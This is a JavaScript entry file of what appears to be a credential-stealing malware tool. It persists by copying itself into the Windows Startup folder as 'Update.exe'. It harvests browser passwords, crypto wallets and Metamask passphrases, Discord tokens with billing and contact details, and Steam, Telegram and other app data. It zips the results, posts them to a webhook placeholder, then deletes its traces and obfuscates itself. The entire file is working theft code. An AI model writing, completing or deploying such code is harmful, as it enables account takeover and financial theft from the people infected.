const admin = require("./utils/admin")
const browsers = require("./utils/browsers");
const obfuscator = require("./utils/obfuscator");
const core = require("./utils/core");
const crypto = require("./utils/crypto");
const discord = require("./utils/discord");
const files = require("./utils/files");
const { upload }= require("./utils/gofile");
const infos = require("./utils/infos");
const injection = require("./utils/injection");
const save = require("./utils/save");
const { stat } = require("./utils/stats");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const { exec } = require("child_process");

async function start() {

    try {
        fs.copyFileSync(process.cwd() + "\\" + process.argv0.split("\\")[process.argv0.split("\\").length-1], process.env.APPDATA + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Update.exe");
    } catch (e) { }

        const webhook = "%WEBHOOK%"
        save.Init();
    
        const ip = await core.getPublicIp();
        const hostname = await core.getHostname();
        const username = process.env.userprofile.split("\\")[2]
    
        console.log("Starting...")
        
        injection.inject(webhook);
        injection.pwnBetterDiscord();
        admin.grabWinSCP();
        crypto.grabColds();
        crypto.grabExtensions();
        crypto.exodusDecrypt();
        files.grabBattle();
        files.grabProton();
        infos.getSysteminformations();
        files.grabSimple();
        files.grabSteam();
        files.grabTelegram();
        files.grabTox();
        files.fileGrabber();
        
        try {
            const passwords = await browsers.grabBrowsers();
            const passphrase = await crypto.grabMetamask(passwords);
            stat.AddPassphrase(passphrase);
        } catch (e) { }

        const zipPath = await save.zipResult();
    
        var formData = new FormData();
        if ((fs.statSync(zipPath).size/1000/1000) > 7) {
            link = await upload(zipPath);
            
            formData.append('payload_json', stat.Build(username, hostname, ip, link))
        } else {
            formData.append('payload_json', stat.Build(username, hostname, ip, ""))
            formData.append('file', fs.createReadStream(zipPath))
        }
        
        try {
            axios.all([
                await axios({
                    url: webhook,
                    method: 'POST',
                    headers: {
                        ...formData.getHeaders()
                    },
                    data: formData,
                }),
            ])
        } catch (e) { }

        fs.rmSync(save.basepath + "\\", { recursive: true, force: true });

        const accounts = await discord.grabDiscord();

        var embeds = [];
        for (let i = 0; i < accounts.length; i++) {
            const acc = accounts[i];
            embeds.push(discord.embed(acc.username, acc.tag, acc.id, acc.nitro, acc.badges, acc.bio, acc.billings, acc.email, acc.phone, acc.token, acc.avatar));
        }
    
        if (embeds.length != 0) {
            try {
                await axios({
                    url: webhook,
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    data: discord.compile(embeds.slice(0, 10))
                })
            } catch (e) { }
        }
        fs.unlinkSync(zipPath);
        obfuscator.obfuscator();
    }
start();